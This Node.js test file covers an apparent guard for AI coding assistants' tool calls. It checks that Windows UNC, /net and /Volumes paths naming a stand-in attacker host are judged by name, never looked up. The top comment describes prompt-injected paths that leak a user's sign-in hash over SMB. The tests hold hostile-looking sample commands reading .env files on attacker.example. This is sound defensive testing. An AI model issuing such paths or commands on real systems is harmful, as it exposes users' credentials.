"use strict";
/* global require, __dirname */
// On Windows, looking up a path like \\host\share\.env opens an SMB connection to that host, and the connection can
// hand it the user's sign-in hash. A prompt-injected path in a read, a shell command, a search or an MCP call must
// therefore never reach the disk, Git or ripgrep: Guard judges it by name alone. This test watches every fs and
// child_process call Guard makes and fails on any that names the made-up host.

const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const childProcess = require("node:child_process");

const ENGINE_PATH = path.join(__dirname, "..", "apps", "guard", "dist", "clotr-engine.js");
const { build } = require("../tools/engine-bundle.js");
const bundle = build().text;
if (fs.existsSync(ENGINE_PATH)) {
  assert.equal(fs.readFileSync(ENGINE_PATH, "utf8"), bundle, "guard engine bundle is stale");
} else {
  fs.mkdirSync(path.dirname(ENGINE_PATH), { recursive: true });
  fs.writeFileSync(ENGINE_PATH, bundle);
}

const HOST = /attacker\.example|192\.0\.2\.1/i;
const touched = [];
function namesHost(value) {
  if (typeof value === "string") return HOST.test(value);
  if (value instanceof URL) return HOST.test(value.href);
  if (Array.isArray(value)) return value.some(namesHost);
  if (value && typeof value === "object") return namesHost(value.cwd);
  return false;
}
// A file write's text can quote a command that names the host, so only fs's path arguments count. Every argument to a
// child process counts, its working folder included.
const TWO_PATHS = /^(?:rename|copyFile|cp|link|symlink)/;
function watch(object, label, names) {
  for (const name of names) {
    const original = object[name];
    if (typeof original !== "function") continue;
    const watched = function (...args) {
      const paths = label === "fs" ? args.slice(0, TWO_PATHS.test(name) ? 2 : 1) : args;
      if (paths.some(namesHost)) touched.push(`${label}.${name}`);
      return original.apply(this, args);
    };
    for (const key of Object.keys(original)) watched[key] = original[key];
    object[name] = watched;
  }
}
// Watched before Guard is loaded, since Guard keeps its own references to child_process's functions.
watch(
  fs,
  "fs",
  Object.keys(fs).filter((name) => /Sync$/.test(name) || ["opendir", "readdir", "stat", "lstat"].includes(name)),
);
const realpathNative = fs.realpathSync.native;
fs.realpathSync.native = function (...args) {
  if (args.some(namesHost)) touched.push("fs.realpathSync.native");
  return realpathNative.apply(this, args);
};
watch(childProcess, "child_process", ["spawn", "spawnSync", "execFile", "execFileSync", "exec", "execSync", "fork"]);

const guard = require("../apps/guard/bin/clotr-guard.js");
const { callTool } = require("../apps/guard/bin/clotr-mcp.js");

function untouched(label, run) {
  touched.length = 0;
  const result = run();
  assert.deepEqual(touched, [], `${label} looked up the other computer's path`);
  return result;
}

const SECRET_PATHS = [
  "\\\\attacker.example\\share\\.env",
  "//attacker.example/share/.env",
  "\\\\?\\UNC\\attacker.example\\share\\.env",
  "\\\\.\\UNC\\attacker.example\\share\\.env",
  "\\??\\UNC\\attacker.example\\share\\.env",
  "file://attacker.example/share/.env",
];
const PLAIN_PATHS = SECRET_PATHS.map((value) => value.replace(".env", "notes.txt"));
const REMOTE_CWD = "\\\\attacker.example\\share";

test("the watch sees a lookup of the other computer's path", () => {
  touched.length = 0;
  try {
    fs.lstatSync("\\\\attacker.example\\share\\never-made", { throwIfNoEntry: false });
  } catch {
    // Only the record matters.
  }
  assert.deepEqual(touched, ["fs.lstatSync"]);
  touched.length = 0;
});

test("is_secret_file and isSecretPath judge another computer's path by its name, without the disk", () => {
  for (const value of SECRET_PATHS) {
    assert.equal(
      untouched(value, () => guard.isSecretPath(value)),
      true,
      value,
    );
    assert.deepEqual(
      untouched(value, () => callTool("is_secret_file", { path: value })),
      { is_secret_file: true },
    );
  }
  for (const value of PLAIN_PATHS) {
    assert.equal(
      untouched(value, () => guard.isSecretPath(value)),
      false,
      value,
    );
  }
  assert.equal(
    untouched("relative .env", () => guard.isSecretPath(".env", "", REMOTE_CWD)),
    true,
  );
  assert.equal(
    untouched("relative notes", () => guard.isSecretPath("notes.txt", "", REMOTE_CWD)),
    false,
  );
});

// A host that doesn't answer held the one-threaded MCP server about 21 seconds a call while Windows tried SMB, so every
// other check waited. Judged by name, an ordinary file on another computer comes back at once, untouched.
test("is_secret_file answers at once for an ordinary file on another computer, and never looks it up", () => {
  for (const value of [
    ...PLAIN_PATHS,
    "\\\\192.0.2.1\\s\\a.txt",
    "\\\\attacker.example\\s\\notes.md",
    "//attacker.example/s/readme.txt",
  ]) {
    const started = Date.now();
    const result = untouched(value, () => callTool("is_secret_file", { path: value }));
    const elapsed = Date.now() - started;
    assert.deepEqual(result, { is_secret_file: false }, value);
    // Well under a millisecond by name; a lookup of a host that doesn't answer took about 21 seconds.
    assert.ok(elapsed < 1000, `${value} took ${elapsed} ms`);
  }
});

// On macOS (and Linux with autofs), looking up /net/<host>/... mounts that host's NFS exports: a network call to a host
// the caller picks, and a stall while it doesn't answer. Those paths are judged by name, as \\host\share is. A file under
// /Volumes is often on a share another computer serves, so is_secret_file, which promises no network calls, judges
// that by name too.
const AUTOMOUNT_PATHS = [
  "/net/attacker.example/export/notes.md",
  "/NET/attacker.example/export/notes.md",
  "/./net/attacker.example/export/notes.md",
  "/tmp/../net/attacker.example/export/notes.md",
  " /net/attacker.example/export/notes.md",
];
const VOLUME_PATHS = ["/Volumes/attacker.example/notes.md", "/volumes/./attacker.example/notes.md"];

test("is_secret_file judges a /net automount path and a /Volumes path by name, without the disk", () => {
  for (const value of [...AUTOMOUNT_PATHS, ...VOLUME_PATHS]) {
    const started = Date.now();
    assert.deepEqual(
      untouched(value, () => callTool("is_secret_file", { path: value })),
      { is_secret_file: false },
      value,
    );
    assert.ok(Date.now() - started < 1000, value);
    assert.deepEqual(
      untouched(value, () => callTool("is_secret_file", { path: value.replace("notes.md", ".env") })),
      { is_secret_file: true },
      value,
    );
  }
  for (const value of AUTOMOUNT_PATHS) {
    assert.equal(
      untouched(value, () => guard.isSecretPath(value)),
      false,
      value,
    );
  }
  assert.equal(
    untouched("relative in /net", () => guard.isSecretPath("notes.md", "", "/net/attacker.example/export")),
    false,
  );
  assert.equal(
    untouched("relative .env in /net", () => guard.isSecretPath(".env", "", "/net/attacker.example/export")),
    true,
  );
});

test("the read, shell and search checks never look up a /net automount path", () => {
  for (const value of AUTOMOUNT_PATHS) {
    const read = untouched(`read ${value}`, () =>
      guard.inspectRead("claude", { tool_name: "Read", tool_input: { file_path: value } }),
    );
    assert.deepEqual(read, { action: "allow", internalError: true }, value);
    const secret = untouched(`read .env ${value}`, () =>
      guard.inspectRead("claude", { tool_name: "Read", tool_input: { file_path: value.replace("notes.md", ".env") } }),
    );
    assert.equal(secret.action, "block", value);
  }
  const shell = (command) =>
    untouched(command, () => guard.inspectShell("claude", { tool_name: "Bash", tool_input: { command } }));
  assert.equal(shell("cat /net/attacker.example/export/notes.md").action, "allow");
  assert.equal(shell("cat /net/attacker.example/export/.env").action, "block");
  assert.equal(shell("grep -r token /net/attacker.example/export").action, "allow");
  const search = untouched("Grep in /net", () =>
    guard.inspectRead("claude", {
      tool_name: "Grep",
      tool_input: { pattern: "token", path: "/net/attacker.example/export", output_mode: "content" },
    }),
  );
  assert.equal(search.searchLimited, true);
});

test("the read hook stops a secret name on another computer and never opens a file there", () => {
  for (const tool of ["claude", "gemini", "windsurf", "cline"]) {
    const event = (filePath, cwd) =>
      tool === "windsurf"
        ? { tool_info: { file_path: filePath }, cwd }
        : tool === "cline"
          ? { preToolUse: { toolName: "read_file", parameters: { path: filePath } }, cwd }
          : { tool_name: tool === "claude" ? "Read" : "read_file", tool_input: { file_path: filePath }, cwd };
    for (const value of SECRET_PATHS) {
      const outcome = untouched(`${tool} ${value}`, () => guard.inspectRead(tool, event(value)));
      assert.equal(outcome.action, "block", `${tool} ${value}`);
      assert.equal(outcome.secretFile, true);
    }
    for (const value of PLAIN_PATHS) {
      const outcome = untouched(`${tool} ${value}`, () => guard.inspectRead(tool, event(value)));
      assert.deepEqual(outcome, { action: "allow", internalError: true }, `${tool} ${value}`);
    }
    const relative = untouched(`${tool} relative`, () =>
      guard.inspectRead(tool, event("notes.txt"), { cwd: REMOTE_CWD }),
    );
    assert.deepEqual(relative, { action: "allow", internalError: true });
  }
  // Cursor sends the file's text with the event, so that text is still checked.
  const cursor = untouched("cursor", () =>
    guard.inspectRead(
      "cursor",
      { file_path: PLAIN_PATHS[0], content: "key AKIA4HPQ7XZ2R6TWLJ3N" },
      { cwd: REMOTE_CWD },
    ),
  );
  assert.equal(cursor.action, "block");
});

test("shell checks judge operands, globs and recursive reads on another computer by name", () => {
  const shell = (command, cwd) =>
    untouched(command, () =>
      guard.inspectShell("claude", { tool_name: "Bash", tool_input: { command, ...(cwd ? { cwd } : {}) } }),
    );
  for (const value of SECRET_PATHS) {
    assert.equal(shell(`cat '${value}'`).action, "block", value);
    assert.equal(shell(`tr a b < '${value}'`).action, "block", value);
  }
  for (const value of PLAIN_PATHS) assert.equal(shell(`cat '${value}'`).action, "allow", value);
  // A glob Guard can't list is judged by the secret names it could match, as for a local folder Guard can't read.
  for (const command of ["cat //attacker.example/share/*", "grep -r token '\\\\attacker.example\\share\\*'"]) {
    assert.equal(shell(command).action, "block", command);
  }
  assert.equal(shell("cat *", REMOTE_CWD).action, "block");
  for (const command of [
    "cat '\\\\attacker.example\\share\\*.md'",
    "grep -r token //attacker.example/share",
    "grep -r token '\\\\attacker.example\\share'",
    "rg token //attacker.example/share",
    "cat //attacker.example/share/n*/in*",
    "node -e \"require('fs').readFileSync('//attacker.example/share/notes.txt')\"",
  ]) {
    assert.equal(shell(command).action, "allow", command);
  }
  // A working folder on another computer, which the assistant can name in the tool call.
  for (const command of ["cat notes.txt", "cat n*/in*", "grep -r token .", "rg token"]) {
    assert.equal(shell(command, REMOTE_CWD).action, "allow", command);
  }
  assert.equal(shell("cat .env", REMOTE_CWD).action, "block");
});

test("a search of a folder on another computer isn't walked", () => {
  const outcome = untouched("Grep", () =>
    guard.inspectRead("claude", {
      tool_name: "Grep",
      tool_input: { pattern: "token", path: "\\\\attacker.example\\share", output_mode: "content" },
    }),
  );
  assert.equal(outcome.action, "allow");
  assert.equal(outcome.searchLimited, true);
  const relative = untouched("Grep in a remote folder", () =>
    guard.inspectRead(
      "claude",
      { tool_name: "Grep", tool_input: { pattern: "token", output_mode: "content" } },
      { cwd: REMOTE_CWD },
    ),
  );
  assert.equal(relative.searchLimited, true);
  for (const tool of ["gemini", "cline"]) {
    const name = tool === "gemini" ? "search_file_content" : "search_files";
    const event =
      tool === "cline"
        ? { preToolUse: { toolName: name, parameters: { path: "//attacker.example/share", regex: "x" } } }
        : { tool_name: name, tool_input: { pattern: "x", path: "//attacker.example/share" } };
    assert.equal(untouched(tool, () => guard.inspectRead(tool, event)).action, "allow");
  }
});

test("a prompt or tool check with a working folder on another computer looks for no ignore file there", () => {
  untouched("prompt", () => guard.inspectPrompt("claude", "hello there", { cwd: REMOTE_CWD }));
  untouched("tool", () =>
    guard.inspectTool("claude", { tool_name: "mcp__x__y", tool_input: { a: "b" }, cwd: REMOTE_CWD }),
  );
});

test("a read or search of a home folder path (`~/...`) from a working folder on another computer looks nothing up there", (t) => {
  const os = require("node:os");
  const home = fs.mkdtempSync(path.join(os.tmpdir(), "clotr-net-home-"));
  fs.writeFileSync(path.join(home, "notes.txt"), "notes\n");
  const saved = { HOME: process.env.HOME, USERPROFILE: process.env.USERPROFILE };
  process.env.HOME = home;
  process.env.USERPROFILE = home;
  t.after(() => {
    for (const [name, value] of Object.entries(saved)) {
      if (value === undefined) delete process.env[name];
      else process.env[name] = value;
    }
    fs.rmSync(home, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
  });
  for (const [tool, event] of [
    ["claude", { tool_name: "Read", tool_input: { file_path: "~/notes.txt" } }],
    ["claude", { tool_name: "Grep", tool_input: { pattern: "x", path: "~/notes.txt", output_mode: "content" } }],
    ["codex", { tool_name: "mcp__fs__read_file", tool_input: { path: "~/notes.txt" } }],
    ["gemini", { tool_name: "read_file", tool_input: { file_path: "~/notes.txt" } }],
  ]) {
    untouched(`${tool} ${event.tool_name}`, () => guard.inspectRead(tool, event, { cwd: REMOTE_CWD }));
  }
  untouched("claude MCP read", () =>
    guard.inspectTool(
      "claude",
      { tool_name: "mcp__fs__read_text_file", tool_input: { path: "~/notes.txt" } },
      { cwd: REMOTE_CWD },
    ),
  );
});
